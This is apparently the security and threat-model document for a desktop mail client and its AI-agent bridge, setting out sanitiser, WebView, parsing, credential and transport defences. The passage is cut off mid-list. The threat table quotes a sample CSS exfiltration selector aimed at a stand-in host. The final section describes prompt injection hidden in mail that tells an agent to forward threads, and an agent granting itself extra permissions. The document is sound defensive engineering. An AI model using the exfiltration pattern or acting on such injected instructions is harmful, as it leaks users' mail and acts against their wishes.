# Security and threat model

Every byte that arrives over IMAP was written by someone else, possibly with
intent. This document lists what we defend against, how, and what we do not
defend against. Code that touches mail content must be reviewed against it.

## 1. Assets

- The user's mail content and metadata (confidentiality, integrity).
- Credentials: passwords, OAuth2 refresh/access tokens.
- The user's identity as a sender (no unauthorised sending).
- The local machine: no code execution, no file exfiltration.
- The user's privacy: no unrequested network requests triggered by mail.

## 2. Attackers

- **Mail sender**: anyone can send a crafted message. Full control over
  headers, MIME structure, bodies, attachment names.
- **Mail server / network**: a compromised or hostile IMAP/SMTP server, or an
  on-path attacker if TLS is misconfigured. Controls every protocol byte.
- **Local unprivileged process** (limited scope): another app in the same
  user session. Flatpak reduces, but does not remove, this.

Out of scope: a compromised user account on the machine, a compromised OS,
physical access to an unlocked session, and endpoint malware.

## 3. HTML mail

### 3.1 Threats

| Threat | Vector | Consequence |
|---|---|---|
| Script execution | `<script>`, `on*=`, `javascript:` URLs, SVG scripting, `<object>`/`<embed>` | full compromise of the rendering context |
| Tracking pixels | remote `<img>`, CSS `url()`, `@import`, `@font-face`, `<link>`, `srcset`, `<video poster>` | confirms address is live, leaks IP, time, client, sometimes read-receipts of forwarded mail |
| CSS exfiltration | attribute selectors + `url()` (`input[value^="a"] { background: url(https://x/a) }`), `@font-face` unicode-range | leak of page content character by character |
| Content spoofing / overlay | `position: fixed/absolute` overlays, z-index tricks, hidden text, `<form>` with our styling | phishing that looks like client UI |
| Masked links | link text ≠ href, IDN homographs, `data:` and `blob:` URLs | phishing |
| Frame / navigation | `<iframe>`, `<meta http-equiv=refresh>`, `<base href>` | loading arbitrary origins, rewriting relative links |
| Resource exhaustion | deeply nested tags, huge documents, billion-laughs-style entity tricks, giant images | UI hang, memory exhaustion |
| Mixed-content reference | `cid:` pointing to non-existent or foreign parts | confusion, occasional parser bugs |
| Allow-list spoofing | forged `From` matching a trusted address or display name | remote images load under the `knownSenders` policy for a message the trusted party never sent |

### 3.2 Defences

Layer 1 — **backend sanitiser** (`backend/internal/sanitize`), the primary
defence. Requirements are listed in that package's documentation; summary:

- parse to a tree (`golang.org/x/net/html` family), never regex the source;
  re-serialise from the tree;
- element allow-list (text formatting, lists, tables, images, links,
  `<div>/<span>`, basic structure); everything else dropped with children
  kept or dropped depending on the element;
- attribute allow-list per element; all `on*` removed; URL-valued attributes
  parsed and restricted (`http`, `https`, `mailto`, `cid`); anything else
  removed and counted;
- remote references removed under the default `block` policy. Under
  `allow`, `https:` images are fetched by the daemon (`internal/remoteimg`)
  and inlined as `data:` URIs, so the webview itself never makes a request:
  no cookies, no `Referer`, a fixed `User-Agent`, https only including
  redirects, the media type sniffed from the bytes (never trusted from the
  server, SVG never accepted), 2 MiB per image, 8 MiB and 32 images per
  message, 10 s in total; an image that fails to load is dropped and
  counted. A tracking pixel (at most 2 px wide or high, or hidden) is never
  fetched under any policy. `allow` comes either from an explicit
  per-call override or from the stored preference; the `knownSenders`
  preference is resolved to `allow`/`block` *before* the sanitiser runs
  (`internal/core`), so the sanitiser only ever sees the two-state decision
  and fails closed on anything else. The allow-list holds bare addresses the
  user sent mail to or approved explicitly, matched case-insensitively on
  the address only (never the display name), and every sender of a message
  must be on it. This does not defend against a forged `From` with a
  trusted *address*; DKIM/SPF-aware trust is future work, and the policy is
  off by default;
- CSS (both `<style>` and `style=""`) parsed and re-emitted through a
  property allow-list; `url()`, `expression()`, `@import`, `@font-face`,
  `position: fixed|absolute` (outside the message's own box), negative
  margins beyond bounds, and `content:` are removed;
- links: only `http(s)`/`mailto`; `target` removed; every link exported in
  `links[]` with its real `href` so the UI displays the destination;
  homograph-suspicious hosts flagged (later);
- `cid:` rewritten to `malachi-cid:<accountId>/<messageId>/<partId>` only
  for parts that exist, so the view's scheme handler is stateless and a
  message cannot name another message's parts (a `malachi-cid:` URL written
  by the mail itself is kept only when it names one of its own parts);
- size cap on input and output, nesting-depth cap, node-count cap,
  attribute-count cap, CSS rule cap;
- a `sanitizerVersion` string returned with every body; bump on any rule
  change so cached bodies are regenerated;
- **fail closed**: any parser error or cap breach withholds the HTML
  (`message.body` sets `htmlWithheld` and still serves the plain text;
  `draft.save` fails with `sanitizeFailed`). Sanitising the output again
  is the identity, which the fuzz target checks.

Layer 2 — **the UI webview** (WebKitGTK 6.0):

- JavaScript disabled in `WebKitSettings`; plugins, media, WebGL, WebAudio,
  local storage, databases, DNS prefetching and hyperlink auditing off;
- Content-Security-Policy `default-src 'none'; img-src malachi-cid: data:;
  style-src 'unsafe-inline'`, set both as the view's default policy and as
  a `<meta>` in the loaded document; `data:` covers only what the daemon
  inlined, the sanitiser removes a message's own `data:` URLs;
- a custom URI scheme handler serving `malachi-cid:` parts through
  `message.part` (images only, never SVG); network access for the view
  otherwise denied (an ephemeral `WebKitNetworkSession` pointed at an
  unreachable proxy, plus `decide-policy` denial of every navigation but
  the initial load);
- navigation intercepted: any link activation is cancelled, the destination
  displayed, and opened via the OpenURI portal on user confirmation;
- the view is a separate process (WebKit's process model) with a fresh
  ephemeral data manager per message;
- tested with the corpus in `backend/testdata/mime`.

Layer 2 exists so a sanitiser bug is not automatically a compromise; it is
not a reason to relax layer 1.

Layer 2 on macOS (`macos/Sources/MalachiMail/WebViews/MessageWebView.swift`,
[macos-port.md §5](macos-port.md#5-the-webkit-security-layer)) is re-established
for WKWebView, since nothing of the WebKitGTK configuration carries over:

- content JavaScript off (`allowsContentJavaScript = false`), no
  JavaScript-opened windows, a non-persistent data store, media only on
  user action, no link previews or magnification;
- the same Content-Security-Policy as a `<meta>` in the document
  (`viewerDocument`), which is the only carrier because a WKWebView has no
  default policy of its own; the document is always built from the
  sanitiser's output and loaded with `baseURL: nil`;
- `PartSchemeHandler` for `malachi-cid:` through `message.part`, images
  only, never SVG, stateless and cancelled with the request; network
  otherwise denied by a proxy nothing answers on (`127.0.0.1:1`) **and a
  content rule list** that blocks every load except `malachi-cid:`,
  `data:` and `about:blank`, since a `<link rel="preconnect">` opens a
  connection without a request that neither the CSP nor the proxy
  setting sees; no body is loaded before the list is installed, and none
  at all when it cannot be: the list is compiled once per process
  (`WebViews/ContentRules.swift`, the default store first, then a store
  in a temporary directory), a failure is never cached and is a fault in
  the log, and a view without the list drops the body and reports it, so
  the reader shows the plain text with the "could not be shown safely"
  hint instead, as for HTML the daemon withheld;
- navigation: only the initial `about:blank` load is allowed. A click on
  a link is taken by the view's own script before WebKit navigates: it
  cancels the click and reports the `href` attribute *as written*, which
  is the string the daemon lists in `links[]`, beside the URL WebKit
  resolved it to; the actions layer matches the attribute against the
  list exactly and confirms a masked link with its text and real target.
  WebKit's resolved URL (host lower-cased, IDN in punycode, a slash
  added) never compares equal to the list, so it is not what is matched.
  Stricter than GTK: an http(s) link the list does not hold, which is
  what a link activation reaching the navigation policy without a click
  amounts to, is confirmed with its destination shown, never opened
  silently. Every other navigation cancelled, no new windows, drops
  refused; the context menu keeps Copy and Copy Link only;
- the view's script and its message handlers live in a content world of
  their own (`WKContentWorld.defaultClient`), so nothing of the document
  could reach them even if content JavaScript were ever on;
- the plain-text body and the selectable header labels keep the system's
  text services out (a context menu of Copy and Select All only, no
  Services requestor, no Look Up preview), so a selection of mail text is
  never handed to another program by a path around the link handling;
- WebKit's separate content process; one view per pane, reused between
  messages with the document replaced whole.

### 3.3 Composed HTML

HTML written in the compose editor is hostile too: a paste from a web page
carries tracking pixels, scripts, hidden text and forms. It crosses the
local socket raw, but the backend sanitises it in `draft.save` (compose
mode: fixed `block` policy, `data:` URLs removed, `cid:` only to the
draft's own inline attachments) before anything is stored, listed or sent;
`blocked` in the result tells the UI what was removed. A quoted original
(reply, forward) never reaches the editor raw either: `draft.create`
sanitises it in the backend, in the same compose mode, and copies its
inline pictures into the attachment store under ids of the backend's own
choosing, so the quote references nothing of the received message. The
UI editor itself renders only what the user typed, backend-returned draft
HTML and escaped fallback quotes, under the layer-2 rules: no page
JavaScript, a CSP without network access, navigation denied, and a `cid:`
handler that serves only ids the window registered — files the user
picked, and the backend's copies fetched through `attachment.get`, which
are served only when they are pictures (never SVG) within the cap. The
macOS editor (`WebViews/ComposeWebView.swift`, `CIDSchemeHandler.swift`)
keeps the same rules on WKWebView: content JavaScript off with the
bridge as a user script in a content world of its own (`window.malachi`
and its message handler do not exist in the page's world), the same CSP
`<meta>`, the proxy and a content rule list that allows only `cid:` and
`data:` pictures and without which no document is loaded (the editor
then reports a failure and the compose window shows its editor-failure
toast; the text it was given stays saveable), every navigation after the
initial load cancelled, no context menu, dropped files taken away from
WebKit and handed to attachment import so a `file:` URL never reaches
the page.

## 4. Message parsing (MIME)

- Parsers assume malformed input: missing boundaries, wrong `Content-Length`,
  8-bit in 7-bit parts, nested `message/rfc822` bombs, hundreds of
  alternative parts, invalid charsets, header injection with bare CR/LF.
- Caps on: part count, nesting depth, header count and size, decoded size.
  `internal/mime` enforces 500 parts, nesting depth 20, a 256 KiB header
  block and 1 MiB of extracted text per message; the syncer refuses raw
  messages over its own cap before they are downloaded (`bodyState:
  "tooBig"`). A message that breaks a cap is `failed`, never partially
  trusted.
- Raw RFC 822 messages are stored as received, as `0600` files in a `0700`
  per-account directory under `<data dir>/messages/`, and are removed with
  their folder or account. They are input for later parsing, never served.
- `messages.text_body` (what `message.body` returns as `text`) is derived
  text only: the decoded `text/plain` part, or for HTML-only messages a
  text rendering produced by walking the HTML *tokens*
  (`golang.org/x/net/html` tokenizer, text nodes only; scripts and styles
  skipped). No tag, attribute or entity reaches that column, and no HTML is
  cached anywhere: the sanitiser will work from the raw file.
- Attachment filenames are sanitised (no `/`, `\`, control chars, bidi
  controls such as U+202E that would make the displayed extension lie,
  leading dots, over-long names) and shown with their detected type, not
  only the claimed one. Executable types are never opened directly: the UI
  offers only "Save As" for them, judged by the last extension and the
  claimed content type (`ui/internal/window/attachments.go`). The macOS
  client adds what that platform runs, installs or follows on a double
  click (Terminal scripts, `.app`, `.pkg`, configuration profiles, Java
  Web Start, AppleScript and Automator documents, bundles, `.webloc` and
  the other location files, Mach-O and installer media types;
  `MalachiCore/Model/AttachmentChips.swift`) and asks the type system
  whether the claimed name or type conforms to an executable, script,
  application, bundle or package (`Attachments/AttachmentActions.swift`);
  the check runs on what the message lists before the fetch and again
  on the name and type `message.part` served, which are what the file
  gets. The client repeats the name sanitiser on every name it writes
  (`safeFileName`: last path component, no control or bidi characters,
  no leading dots, 255 bytes, and `:` to `_`).
- An attached message (`message/rfc822`, or a part named `.eml`) is never
  parsed during sync. `message.embedded` renders it only when the user
  opens it, from the part's bytes, through the same parser, limits and
  sanitiser as any body; its `cid:` pictures are inlined under the
  remote-image caps with their type sniffed from the bytes, the parser does
  not recurse into a message attached to it, its other parts are named but
  cannot be fetched, and nothing about it is stored. The remote-content
  policy is resolved for the containing message's sender, not for the
  forwarded `From`.
- Charset decoding is best-effort with replacement characters; never a
  crash, never a hang.
- Every new parser gets pathological samples in `testdata/mime` and a fuzz
  target.
- `Message-ID`, `In-Reply-To` and `References` only ever link
  conversations (architecture §3.4): matched exactly, never used as an
  identity, capped at 50 references per message (repeats count once), 512
  rows per lookup and 500 members per merge, and never grouped by subject.
  A message that forges a thousand identifiers of other people's mail
  reaches at most one 500-member group; it cannot fold a mailbox into one
  thread, and a Graph conversation is never rewritten by a local message.
- Attachment import (`attachment.import`) treats the path from the UI as
  input, not as trust: it must be absolute and name a regular file after
  following symlinks; it is opened `O_NONBLOCK` so a FIFO or device cannot
  hang the daemon; the size cap is checked at stat time *and* enforced
  during the copy; the content type is sniffed, never taken from the client
  or the extension alone; the file name goes through the same sanitiser
  (`internal/safename`) as received names.

## 5. Signatures and encryption (EFAIL and friends)

Not implemented in phase 1. When PGP/S/MIME arrives:

- Decrypt/verify only in the backend; the UI sees a verdict and sanitised
  content.
- **EFAIL direct-exfiltration**: never render a message where encrypted
  and unencrypted MIME parts are mixed into one HTML document. Each
  encrypted part is rendered alone, and remote content is *always* blocked
  in decrypted content regardless of the user's `allow` policy.
- **EFAIL malleability gadgets**: require MDC/AEAD for OpenPGP; refuse to
  show content whose integrity check failed, no "show anyway" button.
- Signature verdicts are displayed with the signer's *verified* identity, not
  the `From` header text; a valid signature by the wrong key is shown as a
  warning, not a checkmark.

## 6. Credentials

- Passwords and OAuth2 refresh tokens go to the system keyring through
  `org.freedesktop.secrets` (libsecret). **Never** to `config.toml`, the
  SQLite store, logs, or crash reports.
- Access tokens are held in memory only.
- Microsoft 365 accounts (`kind: graph`) with `graph.source: goa` have no
  secret of their own: the sign-in and the refresh token live in GNOME
  Online Accounts, and the daemon asks `org.gnome.OnlineAccounts`
  (`internal/auth/goa`) for access tokens over the session bus, the same
  trust domain as the Secret Service below. With `graph.source: daemon`
  (the backend's own sign-in, below) the account keeps a refresh token in
  the keyring like any other `daemon` account. A token is cached in memory until shortly before the expiry GOA
  reports, dropped when the service rejects it, and scrubbed from any error
  text the service echoes. Revoking the sign-in in GNOME Settings cuts the
  daemon off at the next token request.
- Google accounts (`oauth2` endpoints with `source: goa`) take the same
  route with a token scoped for IMAP/SMTP: the daemon presents it through
  SASL XOAUTH2 (`internal/auth`). Inside the sync engine and the outbox
  the token travels in the parameter the password would, so the same
  redaction scrubs it from error text, and a server refusing it drops it
  from the cache at once (`AuthFailed` hooks) so the next attempt asks
  GNOME Online Accounts again.
- The backend's own OAuth2 sign-in (`source: daemon`,
  `internal/auth/oauth2flow`) serves Gmail and Microsoft 365 where GNOME
  Online Accounts does not run (macOS, KDE, …) or does not hold the
  address. It is the authorization-code flow with PKCE (S256, a fresh
  verifier per session) and a 32-byte random `state` compared in constant
  time. Each session (`account.oauthStart`) opens its own listener on
  `127.0.0.1` on an ephemeral port (the redirect is
  `http://127.0.0.1:<port>/`, a loopback literal, never `localhost`) that
  answers `GET /` only, with header/read/write timeouts, 16 KiB of
  headers, no keep-alive, a closing connection and at most 4 connections
  served at once (more wait in the accept queue); every other path or
  method is a 404. A request whose `Host` is not exactly
  `127.0.0.1:<port>` (DNS rebinding: a page on a name that resolves to
  the loopback address) is refused before anything is looked at. The
  first request with the expected `state` closes the listener (one
  callback, nothing after it); requests with a wrong or missing `state`
  get a 400 and change nothing, so a stray or forged request cannot end
  the session the browser is about to complete. A session lives
  10 minutes, at most 8 run at once, and the backend closes all of them
  on shutdown. The UI opens the authorisation URL — the GTK UI through
  `gtk.URILauncher` (the OpenURI portal inside Flatpak, the desktop's
  default handler otherwise), the macOS UI through `NSWorkspace`; the
  backend never launches a browser.
- The code goes to the provider's token endpoint through a hardened
  client: TLS 1.2+ with the system trust store (the transport policy),
  30 s per request, no redirects followed, no keep-alive. Before anything
  is kept, the signed-in mailbox must be the account's address (trimmed,
  case-insensitive). Google's is the `email` of the ID token: issuer and
  audience are checked (with an array audience, `azp` must be the client
  id too, and a present `azp` always must), `exp` against the clock with
  two minutes of leeway, and `email_verified` must be present and true;
  the token came straight from the token endpoint over TLS, so its
  signature need not be. Microsoft's is Graph `/me` read with the new
  access token — `mail`, else `userPrincipalName` — which the tenant's
  administrators control rather than a verified-address claim; that is
  acceptable because the user performs the sign-in in their own browser,
  so the identity only guards against signing in to the wrong mailbox by
  mistake. An identity with control or Unicode format characters (bidi
  overrides, zero-width characters) is refused, not repaired. Another
  mailbox fails the session (`invalidArgument` with `signedInAs`); its
  tokens are dropped from memory, not revoked at the provider.
- A completed session is bound to what it was started for. Its grant
  records the client (id and Microsoft tenant) the tokens were issued to;
  `credentials.oauthSession` is accepted only for an account whose
  address is the verified mailbox (a grant naming no mailbox never is),
  with the same provider and the client the account resolves to now, and
  a re-sign-in session (`account.oauthStart {accountId}`) only by
  `account.update` / `account.test` of that account. A pending re-sign-in
  is handed out again only while it is for the account's current
  provider, client and address; otherwise it is cancelled and a new one
  opened. `account.oauthCancel` on a completed session discards it and
  its tokens at once instead of at the end of its 10 minutes.
- For Gmail the token carries the `https://mail.google.com/` scope and
  SASL XOAUTH2 hands it to whichever server the account names, so the
  servers are part of the token's audience (RFC 9700 §4.10): a `daemon`
  Google account must name `imap.gmail.com:993` with TLS and
  `smtp.gmail.com` with 465/TLS or 587/STARTTLS, the address as the user
  name on both — enforced by `account.add`, `account.update`,
  `account.test`, `account.oauthStart` and the `config.toml` import.
  Microsoft tokens go only to Graph, whose URL is built in.
- The refresh token lives **only** in the keyring (key
  `oauth2.refresh_token`), written by `account.add` / `account.update`
  when they consume the completed session, by the completion hook of a
  re-sign-in, and rewritten whenever a refresh rotates it (Microsoft
  does). Access tokens stay in memory, cached until 60 s before expiry and
  dropped when a server refuses them; one refresh runs at a time per
  account. A keyring that refuses the token fails `account.add` /
  `account.update` with `keyringError` and keeps nothing. A re-sign-in
  whose token the keyring refuses this time (locked, prompt dismissed)
  stays in memory until the daemon stops; under `MALACHI_KEYRING=none`
  (which can never store it) the re-sign-in fails with `keyringError`
  and the account stays in `authRequired` — such an account can exist
  (added without a session, e.g. from `config.toml`) but never signs in.
  Both cases are logged and reported as `notify.authRequired` with
  reason `keyringError` (no URL). A refresh token the provider rejects
  (`invalid_grant`), or none stored, puts the account in `authRequired`
  and the backend opens a re-sign-in session by itself
  (`notify.authRequired` carries its `authUrl`). Token-endpoint errors
  reach logs and replies only cleaned and with every token, code and
  client secret redacted.
- A stored sign-in belongs to the address, provider and client it was
  made for. `account.update` of a `daemon` account that changes any of
  them (the effective `clientId` / `tenantId` included) without a new
  session deletes the refresh token, cancels a waiting re-sign-in and
  opens a new one for the new configuration; leaving source `daemon`
  deletes it too. When an account changes or goes, its token source is
  retired before the keyring is touched: a refresh still in flight can no
  longer write its rotated refresh token back. The backend's own keyring
  writes of an account (add, update, remove, a completed re-sign-in) are
  serialised per account together with the account row they belong to,
  and a re-sign-in that completes after its account was removed deletes
  what it stored.
- Sign-in sessions share the RPC socket's trust model: the socket is the
  user's own, so any client on it may start a re-sign-in for an account,
  replace the page texts of the one waiting (they are escaped either
  way) or cancel it; none of that reveals a token, and the grant of a
  session reaches an account only through the binding checks above.
- The page the browser shows after the redirect carries the UI's texts
  escaped by `html/template`, runs no script and loads nothing
  (`Content-Security-Policy: default-src 'none'; style-src
  'unsafe-inline'; frame-ancestors 'none'; form-action 'none'; base-uri
  'none'`, `Cache-Control: no-store`, `Referrer-Policy: no-referrer`,
  `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`).
- The OAuth client registrations are configuration, not user secrets:
  `config.toml` `[oauth2.google]` / `[oauth2.microsoft]` (none is built
  in). Google's Desktop-app `client_secret` is an installed-app secret,
  which Google documents as not confidential; it may sit in
  `config.toml`, and the daemon warns at start when that file is
  readable by group or others. Microsoft's registration is a public
  client without a secret.
- Log lines are scrubbed: authentication commands are logged as
  `AUTHENTICATE <redacted>`.
- `account.list` never returns secrets; `Credentials` is write-only.
  `account.add` forwards `credentials.password` to the keyring before it
  returns and drops the account again if the keyring refuses; the
  `accounts` row holds only the non-secret `api.AccountConfig`.
- The keyring client (`internal/auth/secretservice`) speaks the Secret
  Service D-Bus API directly. Items carry the attributes `app`
  (`io.github.schotek.Malachi`), `account` (the opaque account id) and
  `key` (`password` / `oauth2.refresh_token`); the label names the account
  id and key only. The session is `plain`: the session bus is per-user and
  a process able to eavesdrop on it runs as the same user and can already
  read `store.db` and the RPC socket, so the encrypted
  `dh-ietf1024-sha256-aes128-cbc-pkcs7` session would not change the threat
  model. It is the upgrade path if a sandbox ever filters bus traffic.
  Unlock prompts are the desktop's own dialogs; a dismissed prompt is a
  `keyringError`. `MALACHI_KEYRING=none` disables the keyring for
  development and makes every secret operation fail the same way.
- The helper keyring (`MALACHI_KEYRING=helper`, `internal/auth/helper`) is
  the platform-neutral alternative for desktops without a Secret Service:
  the daemon runs the program named by `MALACHI_KEYRING_HELPER` in its
  environment, as the same user, once per operation, git-credential style.
  The request crosses a pipe as one JSON line on stdin and the value comes
  back on stdout; a value is never in argv, a file, the environment or a
  log line, and the helper's stderr reaches an error message only with
  control characters removed, the value redacted and 200 bytes at most. On
  macOS the app sets it to its bundled `malachi-keychain`, which keeps one
  generic-password item per account id and key in the login keychain under
  the service `io.github.schotek.Malachi`; the first read after a rebuild of
  an ad-hoc signed helper is the Keychain's own access prompt. The trust
  model equals the Secret Service's: a process running as the same user
  could already read `store.db` and the RPC socket, so being able to run
  the helper gives it nothing new. On the daemon's side the helper path
  must be absolute and name an executable regular file, one call is
  bounded by 30 s (a Keychain prompt waits for the user), stdout and
  stderr are capped, exit 2 is "no such item" and exit 3 a request the
  helper refused. `malachi-keychain` itself accepts only account ids and
  keys matching `[A-Za-z0-9._-]{1,128}` before anything reaches a
  Keychain attribute, refuses more than 1 MiB on stdin, files the items as
  `<accountId>/<key>` with a label naming the same, and prints the value
  only as the answer to `get`. The app sets the two variables only when
  `MALACHI_KEYRING` is not already in its environment.
- If the keyring is unavailable, the account goes to `authRequired`; we do
  not fall back to plaintext storage.

## 7. Transport

- TLS by default (implicit TLS or STARTTLS with mandatory upgrade).
  `security: none` is accepted only for `localhost` (or a loopback IP) and
  is meant for tests; `account.add` validation enforces it.
- System CA store; certificate errors are fatal for the connection, with a
  clear `tlsError` in `notify.syncState`. There is no "ignore certificate"
  option. The one exception is a pinned certificate
  (`ServerConfig.certificateSha256`): per account and per endpoint, by the
  SHA-256 of the whole DER certificate, set only by an explicit act of
  the user: confirming that exact certificate in the UI (fingerprint
  first, then subject, issuer and validity; a changed certificate gets a
  confirmation of its own that warns of interception and shows the
  previously trusted fingerprint), or writing `certificate_sha256` into
  their own `config.toml`; and only for a password endpoint over TLS or
  STARTTLS — never for `security: none`, never for OAuth2 endpoints (a
  provider's token goes to the provider's servers only) and never for
  Graph or the HTTP clients (discovery, sign-in, remote images), which
  have no such setting. A pinned endpoint accepts exactly that certificate
  and checks neither issuer, name nor validity (a server with its own
  certificate, e.g. a mail bridge reached over a private network, has none
  worth checking); any other certificate fails with `tlsError` reason
  `pinMismatch`, which the UI shows as a changed certificate, and a new
  pin takes the same explicit confirmation. Validation stores the pin as
  64 lowercase hex digits; forgetting it is an `account.update` without it.
- Minimum TLS 1.2, pinned or not.
- Server-supplied strings (capabilities, folder names, error text) are
  treated as untrusted display data.
- Every outbound connection goes through `internal/transport`: one
  `TLSConfig` (TLS 1.2+, system roots, host name verified, no insecure
  knob) and, for IMAP/SMTP endpoints, `EndpointTLSConfig`, which is
  `TLSConfig` unless the endpoint pins a certificate — the only place
  that sets `InsecureSkipVerify`, always together with a
  `VerifyConnection` that compares the leaf's SHA-256 with the pin in
  constant time; a context-aware dial; and one error classifier.
  Timeouts: 10 s to connect, 10 s per command, 20 s for a whole endpoint
  probe; the socket is closed when the deadline passes because the
  protocol libraries have no context support. PREAUTH greetings on a
  STARTTLS connection are refused.
  The libraries' debug writers are never set: they would log credentials.
- Discovery (`account.discover`), what leaves the machine: the domain to
  Mozilla's ISPDB over HTTPS; the full address to the provider's own
  `autoconfig.<domain>` / `.well-known` URLs (it already knows it); the
  domain to the DNS resolver (SRV); and unauthenticated TLS connections to
  `imap.`/`mail.`/`smtp.<domain>`. It is triggered only by the user typing
  an address in the wizard, never by content. Documents are capped at
  256 KiB and parsed with Go's strict decoder (no entity expansion);
  redirects are followed only to https and at most three times.
- Error mapping for `account.test` and later sync: certificate/handshake
  failures, a missing or refused STARTTLS and a server demanding TLS
  before login (SMTP 530/538, IMAP `LOGINDISABLED` on a plaintext
  connection) → `tlsError`; DNS, refused and dropped connections →
  `networkError`; deadlines → `serverTimeout`; IMAP `NO` on login and SMTP
  535/534/5.7.8/5.7.9 → `authFailed`; anything else the server said →
  `serverError`. Messages forwarded to clients are control-stripped and
  capped at 200 bytes. A `tlsError` carries `error.data` (docs/api.md §2):
  the reason and the server's leaf certificate as the verifier saw it —
  fingerprint, subject, issuer, names, validity, self-signed — built from
  the handshake error, never from a second connection; every string from
  the certificate is untrusted text (control, format and line/paragraph
  separator characters removed, ≤ 128 bytes, ≤ 8 names of each kind),
  cleaned again by the UIs. A verdict on a certificate gets a fixed
  `error.message` (stage, reason, fingerprint) instead of the library's
  text, which quotes the certificate's names and issuer: that message
  reaches the logs and, through `sync_status`, agents on the MCP bridge.

### 7.1 Outgoing mail

- The `From` header and the envelope sender are always the account's own
  identity; a draft carries no sender field, so a client cannot spoof one.
- `Bcc` recipients exist only in the SMTP envelope. They are never written
  to the message, so neither the other recipients nor the copy in the Sent
  folder reveal them.
- Every header value (subject, display names, addresses, ids) is validated
  at `draft.save` and stripped of CR, LF and NUL again by the builder, so
  header injection cannot add recipients or forge headers; addresses are
  re-parsed with `net/mail` at send time.
- The built message is capped (`api.MaxOutgoingMessageBytes`) while it is
  streamed to disk; the SMTP `SIZE` extension is honoured before `DATA`.
- A rich-text draft goes out as `multipart/alternative` (the plain-text
  rendering first, then the HTML; inline pictures in a `multipart/related`
  around the HTML, files in a `multipart/mixed` around everything). The
  HTML part is exactly what `draft.save` stored, which is exactly what
  `internal/sanitize` produced in compose mode: nothing that did not pass
  the sanitiser is ever sent as HTML, and a `cid:` in it can only name one
  of the draft's own inline attachments.
- One SMTP session per delivery attempt, retried with backoff; a refused
  password stops all attempts for the account until it is edited, so a
  wrong password cannot lock the account out through repeated logins.

## 8. Local storage

- `store.db` is `0600` in a `0700` directory. Mail is stored unencrypted at
  rest; full-disk encryption is the user's responsibility and is stated in
  the README.
- The RPC socket is `0600`; any process running as the user can talk to the
  daemon. That is the same trust level as reading `store.db` directly, so
  no additional authentication is layered on the socket.
- An attachment being opened is written by the UI to a private `0700`
  directory under `$XDG_RUNTIME_DIR/malachi/open` (or
  `$XDG_CACHE_HOME/malachi/open` without a runtime dir) as a `0600` file
  and handed to the OpenURI portal / the default application. The viewer
  may read it lazily, so the file is not removed at once: the directory is
  emptied when the UI starts and exits, and entries older than an hour are
  swept whenever the next attachment is opened. On macOS the directory is
  `~/Library/Caches/Malachi Mail/open` (there is no runtime dir of the
  XDG kind), each file goes into a fresh `mkdtemp` subdirectory and is
  created `O_EXCL` with mode `0600`, and every file the client writes out
  of a message, whether opened or saved, carries the quarantine attribute
  (type e-mail attachment, agent Malachi Mail), so Gatekeeper and the
  opening application treat it as a download. The attribute is read back
  after it is set: a file written for opening on which it did not stick
  is not opened (the toast says the attachment could not be opened); a
  file the user saved is theirs regardless. Log lines about these files
  carry an error's domain and code in the open and its description, which
  names the file, as private.
- Compose attachments live in `<data dir>/attachments/<id>` (`0600` files,
  `0700` directory); imports that never reach a saved draft are swept
  after 24 h.
- `collected_addresses` holds the recipients of mail the user sent (To, Cc
  and Bcc, with the display name the draft carried) for recipient
  completion. It is never fed from incoming `From` headers: a suggestion
  list that repeated attacker-chosen display names would be a phishing
  aid. Address-book contacts (Evolution Data Server) are read per search
  and never stored; their names are cleaned like any other untrusted
  display text (`docs/api.md` §4.11).

## 9. Sandbox: what Flatpak gives and what it does not

Gives:

- filesystem isolation: the app sees only its own data dirs; attachments
  are opened/saved through the FileChooser portal, so a mail cannot make
  us read `~/.ssh`;
- no direct D-Bus access except the names listed in `finish-args`
  (`org.freedesktop.secrets`, `org.freedesktop.Notifications`,
  `org.gnome.OnlineAccounts`, the Evolution Data Server names);
- WebKitGTK's own process sandbox (bubblewrap) works inside Flatpak;
- a defined runtime, so library versions are known.

Does not give:

- protection against the app itself being malicious or buggy in what it
  *is* allowed to do: with `--share=network` a compromised renderer can
  still make network requests — hence layers 1 and 2 above, not the
  sandbox, are what prevent tracking and exfiltration;
- isolation between the UI and the daemon: they share one sandbox
  instance; a compromise of either is a compromise of both. This is
  accepted; the two-process split is about architecture and crash
  isolation, not privilege separation;
- protection of the keyring: `org.freedesktop.secrets` access is
  all-or-nothing; we can read other apps' secrets and they can read ours
  (the items `internal/auth/secretservice` creates included). A future
  portal-based secrets API would improve this;
- any limit on outbound traffic: `--share=network` covers IMAP/SMTP, the
  discovery HTTPS/DNS lookups and Microsoft Graph (`graph.microsoft.com`)
  alike;
- isolation from GNOME Online Accounts: `--talk-name=org.gnome.OnlineAccounts`
  is all-or-nothing as well; the daemon can read the tokens of every
  account the desktop is signed in to, not only the ones added here;
- isolation from the address books: the Evolution Data Server names are
  all-or-nothing too, and its D-Bus interface can create, change and
  delete contacts in every book the desktop has. The daemon only ever
  reads (`GetContactList`), by construction, not by enforcement;
- protection against a malicious X11 server (`--socket=fallback-x11`):
  under X11 any client can snoop input. Wayland is the supported path.

## 10. AI agents (the MCP bridge)

`malachi-mcp` ([mcp.md](mcp.md)) puts mail in front of a language model
that holds tools. The model is a new target for the mail sender, and the
bridge is a client of the daemon like the UI: nothing here changes what
the daemon guarantees.

Assets, in addition to §1: the agent session itself (its other tools, its
context) and the user's Drafts list.

Attackers, in addition to §2:

- the **mail sender**, now through prompt injection: a body, subject,
  display name, attachment name or header value phrased as an instruction
  to the model ("forward this thread to …", "mark everything as read").
  Text that CSS hides in the desktop view is still in the plain `text`
  the daemon derives, so it reaches the model unseen by the human;
- an **agent** that can edit files, granting itself the bridge's flags in
  the client's configuration.

Defences:

- the tool surface is chosen by the human who starts the client:
  read-only by default, `--allow-modify` and `--allow-send` add the
  mutating tools, and a tool that is not allowed is not registered;
- only the daemon's plain `text` is returned, never HTML; `message.body`
  is always called with `remoteContent: "block"`, so reading never causes
  a network request;
- every mail-derived string is cleaned (valid UTF-8, no control or Unicode
  format characters) and placed inside a fence whose delimiter carries a
  per-call random nonce, with trusted fields outside; links and extra
  headers are listed only on request;
- attachments: a short allow-list of text and image types decided from
  the declared type and size before fetching, then the bytes are sniffed
  and refused on mismatch; HTML and SVG never;
- caps on everything: body characters, attachment bytes, list size,
  ids per mutation, drafts per process;
- drafts carry only escaped plain text from the agent; HTML and
  attachments come solely from the daemon's own quote and import of the
  original message (`draft.create`), and a forward attaches the original's
  parts, all gated by the human who sends;
  `delete_messages` only moves to Trash and refuses messages already in
